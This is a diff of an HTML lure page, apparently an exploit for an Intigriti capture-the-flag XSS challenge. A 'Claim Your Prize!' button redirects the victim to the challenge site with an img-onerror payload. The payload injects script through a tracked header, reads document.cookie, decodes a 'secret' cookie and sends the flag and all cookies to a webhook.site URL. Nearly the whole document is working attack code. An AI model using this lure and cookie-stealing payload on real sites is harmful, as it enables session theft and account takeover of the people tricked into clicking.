@@ -1,53 +1,77 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Click for Flag!</title>
+    <title>Claim Your Prize!</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #f0f0f0;
-        }
-        #clickme {
-            padding: 20px 40px;
-            font-size: 24px;
-            cursor: pointer;
-            position: absolute;
+        #trigger {
+            position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
+            padding: 25px;
+            font-size: 28px;
+            background: #FF4141;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            z-index: 9999;
         }
     </style>
 </head>
 <body>
-    <button id="clickme">Click Here to Win!</button>
+    <button id="trigger">CLICK HERE</button>
 
     <script>
-        document.getElementById('clickme').onclick = function() {
+        document.getElementById('trigger').onclick = () => {
             const payload = `
-                (function() {
-                    const secret = document.cookie.split('secret=')[1]?.split(';')[0] || '';
-                    const decoded = atob(secret);
-                    const flag = decoded.split(':')[1] || '';
-                    fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' + encodeURIComponent(flag));
+                (() => {
+                    const report = data => {
+                        const img = new Image();
+                        img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?' 
+                            + btoa(JSON.stringify(data));
+                    }
+                    
+                    try {
+                        const secret = document.cookie
+                            .split('; ')
+                            .find(r => r.startsWith('secret='))
+                            ?.split('=')[1];
+                        
+                        const flag = atob(secret || '')?.split(':')[1];
+                        
+                        report({
+                            status: 'success',
+                            cookies: document.cookie,
+                            decoded: atob(secret),
+                            flag: flag
+                        });
+                    } catch(e) {
+                        report({
+                            status: 'error',
+                            error: e.message,
+                            stack: e.stack
+                        });
+                    }
                 })()
             `.replace(/\n/g, ' ').replace(/'/g, "\\'");
 
-            const exploitUrl = 
-                'https://challenge-0325.intigriti.io/note/x#' +
+            window.location = `https://challenge-0325.intigriti.io/note/leak#` + 
                 encodeURIComponent(
                     `<img src=x onerror="
                         fetch('/api/track', {
-                            headers: {'x-user-ip': '${payload}'}
-                        }).then(r => r.text()).then(t => eval(t))
+                            headers: {
+                                'x-user-ip': '${payload}'
+                            }
+                        })
+                        .then(r => r.text())
+                        .then(t => {
+                            const s = document.createElement('script');
+                            s.text = t;
+                            document.body.appendChild(s);
+                        })
                     ">`
                 );
-            
-            window.location.href = exploitUrl;
         };
     </script>
 </body>
